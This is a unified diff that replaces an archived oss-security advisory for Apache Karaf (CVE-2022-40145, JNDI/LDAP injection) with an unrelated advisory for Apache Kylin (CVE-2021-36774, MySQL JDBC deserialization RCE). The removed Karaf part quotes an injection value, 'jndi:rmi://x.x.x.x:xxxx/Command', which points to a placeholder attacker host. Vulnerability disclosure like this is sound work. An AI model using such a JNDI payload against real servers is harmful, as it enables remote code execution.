@@ -1,38 +1,27 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/12/21/5
-Message-ID: <1e60267c-edf3-05bc-4e36-78ebe5889664@apache.org>
-Date: Wed, 21 Dec 2022 15:53:26 +0000
-From: Jean-Baptiste Onofré <jbonofre@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/06/5
+Message-ID: <7667fcae.47cc.17e2f40370d.Coremail.xxyu@apache.org>
+Date: Thu, 6 Jan 2022 19:57:24 +0800 (CST)
+From: "Xiaoxiang Yu" <xxyu@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2022-40145: Apache Karaf: JDBC JAAS LDAP injection 
+Cc: jincsheng@...il.com
+Subject: CVE-2021-36774: Apache Kylin: Mysql JDBC Connector Deserialize RCE
 Content-Type: text/plain; charset=utf-8
 
-Severity: low
+Severity: moderate
 
 Description:
 
-This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.
+Apache Kylin allows users to read data from other database systems using JDBC. The MySQL JDBC driver supports certain properties, which, if left unmitigated, can allow an attacker to execute arbitrary code from a hacker-controlled malicious MySQL server within Kylin server processes. 
+This issue affects Apache Kylin Apache Kylin 2 version 2.6.6 and prior versions; Apache Kylin 3 version 3.1.2 and prior versions.
 
-The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc.JDBCUtils#doCreateDatasource
-use InitialContext.lookup(jndiName) without filtering.
-An user can modify `options.put(JDBCUtils.DATASOURCE, "osgi:" + DataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,"jndi:rmi://x.x.x.x:xxxx/Command");` in JdbcLoginModuleTest#setup.
+Mitigation:
 
-This is vulnerable to a remote code execution (RCE) attack when a
-configuration uses a JNDI LDAP data source URI when an attacker has
-control of the target LDAP server.This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.
-
-We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8
-
-This issue is being tracked as KARAF-7568 
+Users of Kylin 2.x & Kylin 3.x should upgrade to 3.1.3 or apply patch https://github.com/apache/kylin/pull/1694.
 
 Credit:
 
-Xun Bai <bbbbear68@...il.com> (reporter)
+jinchen sheng --
 
-References:
-
-https://karaf.apache.org/security/cve-2022-40145.txt
-https://karaf.apache.org/
-https://www.cve.org/CVERecord?id=CVE-2022-40145
-https://issues.apache.org/jira/browse/KARAF-7568
-
+Best wishes to you ! 
+From ：Xiaoxiang Yu
